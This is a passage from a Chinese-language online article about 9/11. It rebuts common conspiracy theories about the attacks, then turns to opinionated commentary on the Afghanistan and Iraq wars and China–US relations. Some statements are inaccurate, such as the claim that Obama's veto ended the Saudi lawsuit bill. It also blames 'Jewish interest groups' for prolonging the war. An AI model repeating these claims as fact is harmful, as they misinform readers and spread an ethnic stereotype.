<br><br>9 点 03 分，美联航 175 号航班，撞向世贸南塔：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-03cc3774af727350afb1b0e9c506ba24_b.gif\" alt=\"\"></figure><p> <br><br>9 点 34 分，美航 77 号航班，撞向国防部五角大楼：</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-dbc6f0f69305014f751b03d46aa0f14d_b.gif\" alt=\"\"></figure><p> <br><br>10 点 02 分，美联航 93 号航班，原定攻击目标是白宫，最终被乘客拦下，坠毁在宾夕法尼亚州一片空地上：</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-be289f44548ef6f01411c4ce176d8ca7_b.jpg\" alt=\"\"></figure><p> <br><br>从一开始，恐怖分子就瞄准了四个目标，世贸双子塔，白宫和五角大楼，它们分别象征着美国的金融、政治和军事中心，目标明确。<br><br>上午 9 点 59 分，南楼倒塌：</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-80c1b4f3e50a6550d7d9d65f18d44a7a_b.gif\" alt=\"\"></figure><p> <br><br>上午 10 点 28 分，北楼倒塌：</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-bdd7242b645b335f5cf0bcb2be4fe10e_b.gif\" alt=\"\"></figure><p> <br><br>下午 5 点，世贸 7 号楼倒塌（注意，这栋楼没有被飞机撞过，后续我会讲到）。<br><br>整个 911 事件，遇难者 2996 人，美国直接损失 2000 亿美元，全球经济损失超过 1 万亿美元。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-262caff2a83ac1bf3d25b990b3fa672f_b.jpg\" alt=\"\"></figure><p> <br><br>全世界的格局和命运，在这一天被改写。</p>\n<p> <br><br><strong>肆</strong><br><br>围绕着 911 事件，有许多疑点。<br><br>有一部纪录片叫《Loose Change》，列举了大量对 911 事件的质问：</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-0c977f1db82c58938bf8d8eccceab955_b.jpg\" alt=\"\"></figure><p> <br><br>然而里面的绝大部分内容都经不起推敲，各种阴谋论非常专业，一般人还真的被唬住，可惜遇到了我。<br><br>直到今天，我们的中文互联网上，凡是提到 911 事件的阴谋论，都来自这个纪录片，原封不动。我也几乎没有看到任何一个视频，任何一篇文章来进行有力反驳，各种讲坛、讲座都一个德行，仿佛各种阴谋论堆砌，就能往美国头上扣屎盆子，就能把美国骂倒一样。<br><br>没必要这样，我们要扣，就一定要科学合理地扣，指出真正问题，而不是轻信谣言。<br><br>所以接下来，我会挑重点的阴谋论来反驳，算是全网独一份。<br><br><strong>质疑一：911 前一个月，有人以 32 亿美元的价格，租下世贸大厦 99 年的使用期，同时投下 35 亿美元保险，赔付条款包括了恐怖主义袭击。</strong><br><br>这个人叫拉里·希尔弗斯坦，是一位 80 岁的犹太商人，他名下已经有一栋自己的房产，那就是世贸大厦 7 号楼（就是那座挨在双子塔旁边，没有被飞机撞过，仅仅因为燃烧而倒塌的第一座钢结构摩天大厦）。<br><br>911 前几个月，他确实签署了这份文件，还买了保险单。<br><br>租赁的钱，他是找通用公司借的，而且他最初只是想购买 15 亿美元的财产保险。但通用公司不同意，一定要他购买 50 亿美元的保单，并且要加上恐怖主义条款，否则不给放贷。毕竟在 1993 年，世贸中心就被炸过，保险单里加入恐怖主义条款，我觉得一点都不奇怪。<br><br>双方互相砍价，最终确定了 35 亿美元的保单。<br><br>911 事件后，这个老人和保险公司打了五年官司，最终获得了 45.5 亿美元的总赔偿金，然后这些钱，他全部拿来重建世贸大厦建筑群了，包括他名下的世贸大厦 7 号塔。<br><br>我想应该没有哪个阴谋家这么蠢，把自己名下的楼弄倒，然后重建吧？<br><br>而且，保险公司只要找到双子塔不是恐怖袭击的证据，而是人为爆破，甚至是美国自己干的，它就没必要赔付这几十亿美元了。<br><br>但保险公司在法庭上从头到尾都没有质疑这点，仅仅围绕着赔偿金额扯皮，比如有两架飞机撞击双子塔，那算不算两次恐怖袭击？赔偿金额应不应该翻倍？仅此而已。<br><br><strong>质疑二：911 前 5 天，有人莫名其妙购买了 3150 股美联航的股票看跌期权，4 倍于当时的美航股价；</strong><br><br>这里首先要纠正一点，不是 3150 股，而是 3150 份，每份 100 股，一共 315000 股的看跌期权。连阴谋论都能抄错，大概率他们也没有买过期权。<br><br>什么是看跌期权？你把它简单理解为，股价跌得越多，赚的钱就越多。<br><br>这个投资者确实买了挺多看跌期权，超过了当天的四倍，但在过去一年，也有经常发生四倍的情况，这不算异常，而且在四天后，他又购买了 115000 股的美联航股票。<br><br>如果他认定美联航会大跌，为什么还要花 30 美元一股的价格，买入 115000 股、价值 300 万美元的股票呢？嫌自己钱多吗？<br><br>所以最合理的解释是，他左手购买看跌期权，右手购买股票，其实就是对冲风险，是一种常见的投资策略。<br><br><strong>质疑三：911 前 4 天，有人买入 27294 股波音公司的看跌期权；前 1 天，有人买入 4516 股美航的看跌期权。</strong><br><br>股和份，我上面已经解释过了，不再展开。这几个人最后都被彻底调查，就是无辜人员。至于他们的购买动机，全部来自于一份美国期权交易通讯，你把它理解成什么电话荐股推销就行了，毕竟当时美股的泡沫已经被戳破，航空股票都在下跌。<br><br>最主要的是，购买看跌期权，是不能匿名的，因为事后你还要亲自去取钱兑换，能策划 911 事件的阴谋集团，至于为了几百万美元暴露自己吗？<br><br>如果真的有内幕人士，想通过 911 事件来赚钱，最好的方法不是购买相关公司的看跌期权，而是直接做空整个美国市场，购买石油期货等等，这样就不会引起任何人注意了。<br><br><strong>质疑四：911 前一周，大楼的炸弹嗅探犬全部撤除。</strong><br><br>这个很有意思了，实际上，世贸大厦的日常时间段，根本没有任何炸弹嗅探犬，它又不是军事禁地，没必要如此严防死守。<br><br>那为什么 911 前几周会有嗅探犬呢？<br><br>因为当时世贸大厦接到了电话威胁，然后这些警犬就派上用场，而且还加班了两个星期，排除掉所有危险才离开。这是不是更能说明，世贸大厦内部没有炸弹威胁，什么定向爆破都无稽之谈呢？<br><br><strong>质疑五：911 前几周，双子塔出于「安全原因」被疏散。</strong><br><br>这条阴谋论是想说，其实早有人预料到了恐怖袭击，于是未雨绸缪，安排紧急疏散演习。<br><br>是的，双子塔有定期的火灾和疏散演习。<br><br>而且有这么一个人，在 93 年世贸停车场爆炸案后，每天忧心忡忡，并且断定下一次肯定会有飞机来撞双子塔，他就是摩根斯坦利的安保负责人雷斯科拉。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-daf662c55f4be0255306547711fc363e_b.jpg\" alt=\"\"></figure><p> <br><br>他一有空就培养公司员工的逃生技能，甚至用秒表计时，谁跑得慢就要被挨骂。在 911 那天，世贸中心的 2700 名摩根斯坦利员工，有 2687 人安全撤出，可他却牺牲了，因为他返回楼里，想着要救更多的人。<br><br><strong>质疑六：911 前一天，国家安全事务助理赖斯，曾打电话给旧金山市长布朗，警告他 911 那天不要搭飞机。</strong><br><br>这个电话不是赖斯打的，而是布朗的机场保安人员打来。因为在 9 月 7 日，美国发布了「全球旅行警告」，但这个警告范围不涉及美国，也就是国内可以随便飞。所以 911 那天，布朗还是乘坐航班了。<br><br><strong>质疑七：世贸双子塔的倒塌原因，不是飞机撞击，而是内部爆破。</strong></p>\n<figure><img src=\"https://pic4.zhimg.com/v2-7f48a3c7ed2963f4ec6b67e0ebaebb87_b.gif\" alt=\"\"></figure><p> <br><br>双子塔的倒塌，不是因为飞机冲撞，而是内部的航空煤油，倾泄进了中央电梯和管道竖井里，形成烟囱效应，燃烧非常迅速。<br><br>这也是为什么撞击层上面的人员几乎无法逃生，甚至要跳楼，非常惨。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-7e8b3ae3c300d82e59903c55551ade41_b.jpg\" alt=\"\"></figure><p> <br><br>据 NIST 的报告，当时中心温度达到了 1000 摄氏度，大厦钢结构的强度已经不到 10%，而且由于防火涂层缺失，消防系统失灵，还有大量可燃材料（地毯、窗帘、家具和纸张等等），导致钢结构无法承受几万吨重量。<br><br>前面我已经分析过了，世贸大厦用的是轻型桁架，由许多钢材拼接而成，远没有我们现在住的钢筋混泥土建筑结实。一旦超出临界值，就会瞬间崩溃，形成多米诺骨牌效应。<br><br><strong>质疑八：世贸双子塔倒塌的过程中，喷出来一些气体，是定向爆破。</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-ff868b350d83e52a5d5872a4d20b87a5_b.gif\" alt=\"\"></figure><p> <br><br>根据美国土木工程师协会团队的解释，塔楼开始倒塌时，所有空气连同粉碎的混凝土，都以巨大能量喷射出来。<br><br>我想吐槽的是，如果这些人真的看过大厦的定向爆破，就会知道引爆炸弹是在倒塌前进行的，不是一边倒塌一边引爆，没有这种牛顿公式。<br><br>我再发一个真实的定向爆破动图，清晰明了：</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-7bdb037e31f6ebe5cd4b2f8727beadf9_b.gif\" alt=\"\"></figure><p> <br><br>注意看，是先有爆破火焰，然后大厦才整体坍塌，和双子塔的由上到下完全不同：</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-bdd7242b645b335f5cf0bcb2be4fe10e_b.gif\" alt=\"\"></figure><p> <br><br><strong>质疑九：双子塔的倒塌时间，和自由落地速度一样，所以是定向爆破。</strong><br><br>双子塔高 417 米，自由落地时间是 9.2 秒，现实中它们用了 14 秒时间才完全倒塌。<br><br>真正的自由落体速度，是那些外围碎片：</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-f7f5a489666f333b670df3f841091d5e_b.jpg\" alt=\"\"></figure><p> <br><br><strong>质疑十：撞击世贸的不是商用飞机，因为它没有窗户，而且底部有吊舱，用来装载导弹。</strong><br><br>质疑者是福克斯新闻的摄影师马克·伯恩，他是站在布鲁克林世贸中心东南 2 英里多的地方，而且他的原话是，没有看到飞机撞到南塔，只听到了爆炸声，所以是以讹传讹。<br><br><strong>质疑十一：世贸七号楼没有被飞机撞过，仅仅因为燃烧不会倒塌，而且倒塌前 20 分钟，就有电视主持人告诉观众，世贸中心 7 号楼已经倒塌，所以肯定是人为爆破。</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-065dbf2be8f9d338f64ad9489ee5dd99_b.jpg\" alt=\"\"></figure><p> <br><br>质疑的爆破痕迹：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-005bc3bdce8ea4128e04d3f7389766f8_b.gif\" alt=\"\"></figure><p> <br><br>真相是，上午北楼倒塌的时候，大量碎片破坏了旁边的 5 号、6 号和 7 号楼，引起大火。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-3e82d05d556e4d80256b23914aefc9ca_b.jpg\" alt=\"\"></figure><p> <br><br>7 号楼的废墟位置：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-3d8256b06f6ae55d4a3fcd038efac41c_b.jpg\" alt=\"\"></figure><p> <br><br>几乎是紧挨着双子塔：</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-b0db77796954552266d01494e060a5a1_b.jpg\" alt=\"\"></figure><p> <br><br>网络上的许多质疑，都是围绕着 7 号楼北面的火势，觉得这点火根本不可能让大楼倒塌：</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-68c6bafe1d3857479608b752d4c08ae3_b.gif\" alt=\"\"></figure><p> <br><br>但如果是南面呢？真实情况是这样的：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-14d962d2e1ccd3e72e7146abb3695418_b.jpg\" alt=\"\"></figure><p> <br><br>南面的一处角落已经全部被摧垮：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-67ff88c988d0722e18ddfa09c7add310_b.jpg\" alt=\"\"></figure><p> <br><br>7 号楼的火势非常大，从上午一直烧到下午，因为里面的燃料管线破裂，导致大量柴油燃烧。更致命的是，双子塔的倒塌，让地下供水中断，最终 7 号楼的喷淋系统出现故障，无法灭火。<br><br>下午两点，消防队员发现七号楼的西南角已经不见了一部分，结构不稳定，发出吱吱声，随时可能崩塌，已经没救了。<br><br>下午三点半，纽约市消防局长决定停止灭火，让所有人撤离七号楼，并疏散了周边地区。<br><br>下午五点播出的电视新闻中，主持人提前告诉观众，世贸 7 号楼已经倒塌，这就是一场简单的直播事故，伦敦方面没有及时得到通知。<br><br>20 分钟后，持续燃烧了 7 个小时的 7 号楼，终于倒塌，而且没有任何人员伤亡。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-c3f3854ed6248cfc95cfb8e715ec325e_b.jpg\" alt=\"\"><figcaption>7 号楼摧毁报告</figcaption></figure><p> <br><br>其实不止 7 号楼，还有 3-6 号楼都有倒塌，包括旁边的德意志银行大厦，已经摧毁过于严重，最后被拆除了。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-3bcef9120001b9e5131440492a0571cc_b.jpg\" alt=\"\"></figure><p> <br><br>在全世界，高层建筑的防火都是世界难题，尤其是全钢结构的摩天大厦。<br><br>目前最高的消防云梯只能到 100 米，因此我们国内已经禁止新建 500 米以上的超高层建筑。<br><br><strong>质疑十二：五角大楼的撞击孔很小，是被导弹击中，而且现场没有任何飞机残骸。</strong></p>\n<figure><img src=\"https://pic4.zhimg.com/v2-9fa441578873a955b04763f25faaa4cb_b.gif\" alt=\"\"></figure><p> <br><br>真相是，最外面的撞击口并不小，它有 90 英尺宽：</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-f9d19efc0f065b4096f8ab51dce68da6_b.jpg\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-ba32fe6c1c2b238d14dd28c55b794b92_b.jpg\" alt=\"\"></figure><p> <br><br>根据普渡大学的坠机计算模拟，损坏与坠毁的飞机完全一致：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-dc6fecb78d29f30db1f2845a440eea48_b.jpg\" alt=\"\"></figure><p> <br><br>至于五角大楼内部的一个 12 英尺孔洞，是由飞机的前起落架造成，而不是机头：</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-914be9564530c011e4d9b3d7b32645d5_b.jpg\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-917f2ecac100ba5d8fb9d0753f843bae_b.gif\" alt=\"\"></figure><p> <br><br>现场残骸也有很多，飞机 APU 门：</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-975496e03b3343e21f499e737efda66f_b.jpg\" alt=\"\"></figure><p> <br><br>主起落架：</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-468e1fb0ce9ca0fc234eb1cf70b7d36b_b.jpg\" alt=\"\"></figure><p> <br><br>航空公司标识：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-6712996587639212aeaaeb160d6bf398_b.jpg\" alt=\"\"></figure><p> <br><br>轮毂：</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-b2fbe26a3ceda7670550e93a53f726e3_b.jpg\" alt=\"\"></figure><p> <br><br>还有发动机，与波音 757 的劳斯莱斯涡轮发动机相同：</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-85ae4fc7ec57741d42a804006901f2ce_b.jpg\" alt=\"\"></figure><p> <br><br>质疑者们经常拿过往的一些空难图，来对比 911 坠机事件，说前者明明还保留大量机身机构，怎么五角大楼的飞机就烧得骨灰不剩。<br><br>那是因为空中爆炸的飞机，没有一个持续燃烧的环境，碎片掉到地上可以原封保留，而坠机往往是持续燃烧，最后只剩一点痕迹。<br><br><strong>质疑十三：纪录片引用了杜勒斯国际机场交通管制员的话，他说控制室的每个人，都认为撞击五角大楼的是一架军用飞机。</strong><br><br>断章取义的翻译，他原话是这么说的：这架飞机的行驶轨迹，就像在驾驶一架军用飞机，很不安全。<br><br><strong>质疑十四：世贸中心的残骸，很快被朱利安尼市长运走，生怕被人看到。</strong><br><br>真相是，一直到 2002 年 5 月 29 日，世贸中心的残骸才正式清理完毕。<br><br><strong>质疑十五：世贸中心有价值 1600 亿美元的黄金丢失。</strong><br><br>这个黄金储备量超过了世界一半，而且没有任何新闻报道，也没有任何可靠信源。<br><br><strong>质疑十六：911 事件后，美国政府公布了 19 名劫机者名单，但英国广播公司找到至少 9 人，他们仍然活着。</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-cc19060e644ceb2887358c8b1d2ce5c6_b.jpg\" alt=\"\"></figure><p> <br><br>直到今天，没有一个生还者公开站出来，也没有一个人在公共场合露面，这 9 个人被证实只是同名而已。<br><br>......<br><br>还有更多的阴谋论，因为伤害性很弱我就不展开了，不然几万字都压不住。</p>\n<p> <br><br><strong>伍</strong><br><br>美国如果想找个理由出兵中东，根本不需要自残，挑两栋有几万名精英办公的金融中心大厦，附带着损毁最核心经济区，甚至还要撞击五角大楼和国会山，撼动自己的霸权地位，导致国际资本恐慌逃离，最终造成数万亿美元损失的代价，并引发一场经济衰退。<br><br>没有哪个政治利益集团，哪个犹太人集团敢这么做，正如奥卡姆剃刀原则，如非必要，勿增实体。<br><br>再通俗点形容就是，说的谎越多，就越难弥补。很多人会举例，历史上美国就策划国类似的恐怖袭击预案，从而找到入侵古巴的借口。<br><br>但预案就是预案，大胆假设，小心求证，最后也没有实施，所以我认为不足以成为确凿铁证。<br><br>当然了，在 911 这件事上，为什么阴谋论会这么多，去质疑美国自导自演，是苦肉计，本质还是对政府和领导班子的不信任。毕竟，911 事件的最大获益方，是石油能源和军工利益集团。<br><br>最值得讨论的是，谁是 911 事件的真正凶手？<br><br>在本·拉登的妻子和儿子奥玛所口述的《本·拉登传》里，就提到了几个细节：<br><br>911 前几天，本·拉登要妻子和孩子们离开阿富汗，去往叙利亚；<br><br>911 事件发生后，奥玛的叔叔闯到他房间，声嘶力竭地说：「看看我哥哥都做了些什么！看看我哥哥都做了些什么！他把我们生活全毁了！他把我们毁了！」<br><br>9 月 13 日，美国国务卿鲍威尔召开新闻发布会，说本·拉登就是 9·11 事件的头号嫌疑犯 。<br><br>随后，小布什在双子塔的废墟上发表讲话：要这些家伙尝尝美国人的厉害。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-ae76015e024ad185dacf0c18d6b6b316_b.jpg\" alt=\"\"></figure><p> <br><br>当时没有一个恐怖组织（敢）站出来说自己对 911 事件负责，包括本·拉登的基地组织。<br><br>9 月 16 日，本·拉登在卡塔尔电视台发表声明：我向全世界保证，袭击不是我策划的。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-cb137bb0eec51727d47b25556262ae79_b.gif\" alt=\"\"></figure><p> <br><br>小布什立即反驳：毫无疑问，他是主要嫌疑人。<br><br>注意了，在 90 年代的几次恐怖袭击中，基地组织都站出来承认，可唯独 911 事件，本·拉登却没有第一时间承认。<br><br>从之后的几次发言来看，本·拉登的演讲有过很多暗示。<br><br>2001 年 10 月 7 日，本·拉登说：全能上帝击中了美国最脆弱的地方，美国今天尝到的东西，和我们几十年相比，实在微不足道。<br><br>11 月，美军在阿富汗找到了本·拉登的一个谈话录像带。<br><br>在录像带中，本·拉登承认对这次袭击有先见之明，但他低估了世贸中心的破坏程度，以为只有飞机撞击区域的上面楼层会倒塌，这也是他所希望的。<br><br>可他依然没有正面回应，承认对 911 事件负责。<br><br>有阴谋论说，这录像带里的人根本就不是本·拉登，而且他用右手写东西，手指上还有金戒指，和本·拉登的人设完全不符合。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-622378ea4f8bde46718b37e296835601_b.jpg\" alt=\"\"></figure><p> <br><br>真相是，本·拉登说了半小时话，就是他本人：</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-f6882db75402daff4402ccf29f790b8b_b.gif\" alt=\"\"></figure><p> <br><br>而且他经常戴戒指：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-6430191c7ad9f0d5eb97c072b908bcb4_b.jpg\" alt=\"\"></figure><p> <br><br>本·拉登的儿子奥玛还解释，说他的父亲根本不是左撇子，是因为右眼曾经受过伤，无法看清东西，才用左眼瞄准。在伊斯兰文化中，身体上的残疾会让人变弱，所以本拉登一直隐瞒这个秘密，宁愿被误认为左撇子。<br><br>到了 2004 年 10 月 30 日，本·拉登才站出来，承认是他下令发动了 9·11 事件，并且还讽刺小布什反应迟钝，说第一架飞机撞到双子塔后，又给了第二架飞机撞击的机会。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-5dcde28c558e2195c43a0bfdee0ed5fb_b.jpg\" alt=\"\"></figure><p> <br><br>至此，基本可以确定，本·拉登是 911 事件策划的直接元凶。<br><br>那么帮凶是谁呢？<br><br>沙特。<br><br>准确来说，是沙特瓦哈比教派里的极端份子，毕竟这十九个劫机者，都来自沙特。<br><br>沙特王室一方面支持「美国反恐」，一方面又在全世界推广极端瓦哈比主义，美国睁只眼闭只眼，总觉得中东需要恐怖平衡，并且很自信，自己的本土不会被袭击。<br><br>所以美国人在复盘 911 事件时，发现了有许多预兆，只是自己一直不放在心上。<br><br>比如在 1999 年，有两个沙特裔男子乘坐飞机，并多次试图闯进驾驶舱，最后被美国警方带走，没有下文。其中一个男子，就和 911 事件有着密切关系。<br><br>19 名沙特劫机者，在全美各地学习如何开飞机，却从来不关心如何降落的问题，一直在学习如何关掉自动驾驶，如何手动开飞机，如何大幅度拐弯等等。<br><br>这些零碎资料，美国情报部门起初没有多少重视，直到 911 发生时才恍然大悟。<br><br>美国政府要求沙特配合调查，资金是如何从沙特流向恐怖组织的账户时，被沙特拒绝，导致两国关系相当糟糕。<br><br>美国强烈谴责沙特，说它在反恐记录上劣迹斑斑，有相当一部分官员是支持本拉登的恐怖行为。<br><br>沙特说美国的指控子虚乌有，双方一直打嘴炮。<br><br>美国还成立一个 911 调查委员会，写了超过 800 页的报告，但中间有 28 页被加密：</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-606b889d55aa6df8ed042cc76e61ca51_b.jpg\" alt=\"\"></figure><p> <br><br>一直到 2016 年，这 28 页文件才被解密公开。<br><br>依据这 28 页报告，美国国会通过一个法案，允许 911 事件的受害者向沙特政府发起诉讼，请求赔偿。<br><br>最后被奥巴马否决了法案，因为沙特外长要挟美国，抛售 7500 亿美元的美国债券和资产。<br><br>911 事件对美国的最大影响是，有 90%的民众支持对恐怖主义的武力打击，支持部署国家导弹防御系统；<br><br>美国政府颁布了爱国者法案，扩张美国警察和政府部门的权限，可以监听所有公民的通讯设备（棱镜计划），向公民征收反恐税；<br><br>最直接的是，美国军工联合体，可以直接插手中东了。<br><br>小布什，就这样站在一个历史的重要分岔口。<br><br>他没有选择继续走克林顿的多元路线，而是积极介入世界，先发制人，哪个国家不够民主，美国就要给它校正一下。<br><br>最终，小布什启动了反恐战争。</p>\n<p> <br><br><strong>陆</strong><br><br>美国要塔利班交出本·拉登，同时驱逐基地组织出境。<br><br>塔利班回绝，正义凛然地说：「只有确切证明本·拉登是元凶的情况下，才可能交人，否则宁可玉碎，也要保护这位最尊贵的客人。」<br><br>话不投机半句多，美国发动阿富汗战争，实行大规模炸弹袭击。阿富汗死了成千上万人，大量人群涌向边境地区，希望能逃离轰炸。<br><br>只空袭了三个星期，塔利班的阵线就全面崩溃，本·拉登不知所踪。<br><br>半年时间，美国推翻塔利班政权，建立阿富汗伊斯兰共和国（由北方联盟执政）。<br><br>进度太过顺利，以至于没有多少成就感，美国国防部又将注意力转移到伊拉克身上，需要向世界展示一下自己的霸权实力。<br><br>进攻伊拉克的理由更简单了，用一瓶刷牙粉来指责伊拉克藏有大规模杀伤性武器，还用一两段视频斥责萨达姆是暴君，在背后支持基地组织。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-a4a366185f7926ca45026486a3310a2e_b.jpg\" alt=\"\"></figure><p> <br><br>但这次是真冤枉萨达姆了。<br><br>因为伊拉克的生化武器是几十年前美国亲手给的，而且他作为世俗政权的独裁狂人，和本·拉登这种极端伊斯兰主义者完全水火不容，双方一碰面就会拼个你死我活。<br><br>萨达姆唯一触及美国的逆鳞，就是允许欧元结算石油，提前给自己掘好了坟墓。<br><br>如果说阿富汗战争，是美国的自卫行动，那攻打伊拉克纯粹就是霸权行为，联合国安理会没有一个同意。但这不影响美国的军事行动，小布什甚至还公开声明，谁站在美国这边就是美国的朋友。<br><br>伊拉克战争正式打响。<br><br>和阿富汗战争一样，在美国的压倒性优势力量下，首都巴格达很快被攻破，萨达姆政权崩溃。</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-1745b2c09f681141539c7627abad4a7f_b.jpg\" alt=\"\"></figure><p> <br><br>对美国来说，推翻伊拉克和阿富汗的政权，各自扶植一个傀儡政权上台，是非常容易的事，问题在于后续如何处理。<br><br>如果美国直接撤兵离开，那不用一个月，塔利班和萨达姆的残余势力将卷土而来，之前所做的一切就都白费了。<br><br>而且美国的最初承诺，是要让这两个国家的人民，过上比战争前更好的生活，消灭恐怖分子，消灭动乱饥饿和贫穷，体现美国人道主义的光辉。<br><br>于是，美国在当地大量驻军，认真实行大中东民主计划，一步步陷入战争泥潭中。<br><br>在伊拉克，由于萨达姆政权下台，被压制许久的伊斯兰势力又浮上水面，宗教势力天然和美国世俗文化不相容，双方很容易爆发冲突。当地百姓只认可伊斯兰文化，并不感冒美国的重建措施，况且国家建设的启动资金，美国也不肯付。<br><br>一旁还有伊朗虎视眈眈，伊朗和伊拉克都是什叶派占多数的国家，双方同根同源，更让美国头疼。<br><br>阿富汗的情况也不太妙。<br><br>塔利班虽然被推翻了，可它的根基没有被撼动，仍有着广泛群众基础。为了不让阿富汗落回极端分子手里，小布什只能下令增兵，在阿富汗的军队从 2 万人增到 3 万人。<br><br>中东人民对驻扎在本土的美军越来越厌烦，甚至是憎恶。<br><br>因为美军的反恐作战简单粗暴，获悉哪个地方有恐怖分子后，直接定位，然后导弹发射，导致经常轰掉一大片居民区，死伤的无辜群众特别多。这些伤亡者的家属，又会开始反对美国，变成新恐怖分子，无休无止。<br><br>2006 年 1 月 20 日，本·拉登的视频演讲在半岛电视台播出，强调他们的状况越来越好，而美国正好相反，士兵阵亡和受伤人数不断增加。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-a031a3b592fdda7a06cc0c839e9a75be_b.jpg\" alt=\"\"></figure><p> <br><br>最后他还说：「你们试图不让我们过上有尊严的生活，但你们不能阻止我们以一种有尊严的方式死去。」<br><br>小布什一直到退任前，都没有处理好中东的烂摊子。发动一场战争很容易，但什么时候结束，已经不由布什政府决定了。<br><br>美国的一些政客、军工石油巨头和犹太人利益集团，它们并不想过早地结束反恐战争，一方面可以拉动军需，巩固以色列在中东的位置，另一方面也能让全世界的避险资金回流本土。<br><br>就像沙特阿拉伯和一众波斯湾小国，通过石油赚取大量美元，可为了安全着想，这些热钱最终还是回到美国的银行和股市债券中。<br><br>反恐战争虽然让美国陷入泥潭，耗费巨资，却也让顶层资本家赚得盆满钵满，在短期战略上非常划算。<br><br>只是从长期战略来看，当中国和俄罗斯在高速崛起时，美国已经错过了最佳打压时间。</p>\n<p> <br><br><strong>柒</strong><br><br>有一个经典论调是，911 事件是中国的国运体现，为我们争取到了宝贵的 10 年发展时间。<br><br>这种说法非常片面，好像中国的国运是本·拉登给的。<br><br>从 90 年代开始，美国确实一直想要制衡中国，但更多的是常规关注，没有集中全部精力打压，它的重心一直聚焦在中东。<br><br>因为萨达姆还很跳，随时有称霸波斯湾的雄心；伊朗也在深化改革，统领什叶派；阿富汗走向保守政策，和美国越来越疏远；俄罗斯逐渐恢复元气，扶持叙利亚......如果美国不在中东版图上扎上几根硬钉子，那会很被动，甚至威胁到美元霸权的地位。<br><br>所以维持中东石油美元的地位，可比打压中国重要得多。<br><br>2001 年初，美国政府就已经考虑要发动阿富汗战争，铲除塔利班政权。911 事件给了美国最好的战争借口，顺理成章出兵阿富汗。<br><br>总结就是，从来就不是本·拉登制造的 911 事件，让美国战略中心转移，而是有了这个契机，让美国得以在中东施展手脚。没有本·拉登，还有李阿登和王阿登，没有 911，还有 811 和 711，最终结果都是要打阿富汗和伊拉克。<br><br>只要中东的石油美元稳住了，中国就必须用美元进口石油，那就始终在美国掌控之中，一切都已经计算好。<br><br>另外，当时美国处于互联网泡沫时期，国内失业率很高，经济面出现恶化，更需要中国这个经济引擎来缓解它的危机，比如加入世贸组织，让中国承接大量廉价制造业，稳住美国的金融市场，保证国内人民的生活水平。<br><br>包括 2008 年的次贷危机，如果没有中国接盘，美国不可能如此轻松熬过来。<br><br>中国被定位成超级市场和超级工厂，做一个超级血包，给美国供血，这是美国给中国留的位置，不是因为 911 事件才决定。<br><br>所以说，中美两国在当时达成了一种平衡妥协，互相仰仗。911 事件，只是加速了美国扎根中东的计划。<br><br>但客观来说，911 事件后，美国就没有继续打压中国吗？<br><br>从小布什到奥巴马，其实一直在围剿中国，既然热战打不起来，就用舆论去和平演变。<br><br>在那个时期，对中国的舆论批判是全方位无死角，我举一个最简单例子。<br><br>911 事件后，华盛顿新闻博物馆建立了一个 911 展馆，有一面墙是专门展示各个国家报纸的第二天头版报道。<br><br>国外大部分报纸的头版头条是 911 事件，还有配图，只有《人日》的头条是讲九运会：</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-9361dec5dfd7efb991f6f044123102c7_b.jpg\" alt=\"\"></figure><p> <br><br>于是被国内公知骂（包括某个紧皱眉头的主持人），说「中国没有普世价值」，「这就是为什么中国在国际上没有朋友的原因」。<br><br>但《人日》的头版真的没有讲 911 事件吗？并不是，它整个头版的报眉和报眼、次头条都是 911 事件：《外交部发言人发表谈话》、《致电美国总统布什》、《美国纽约华盛顿受到严重袭击》、《对我在美人员安全深表关心》......<br><br>这种新闻表述简单直接，客观有力，仅仅因为没有加上 911 事件的插图，没有各种惨绝人寰的跳楼和爆炸图，没有充满悲悯的细致描写，没有用巨大的标题来写「绝望呐喊」、「美国最黑暗的一天」，「美国，被袭击」，「世界大战」等噱头，就要背负骂名，而且在中文互联网上被骂了十几年，从博客骂到微博，从微博骂到微信，战斗力旺盛。<br><br>911 事件发生时，由于时差原因，是北京时间的晚上 8 点多，我记得 8 点半左右，央视新闻就紧急插播了 911 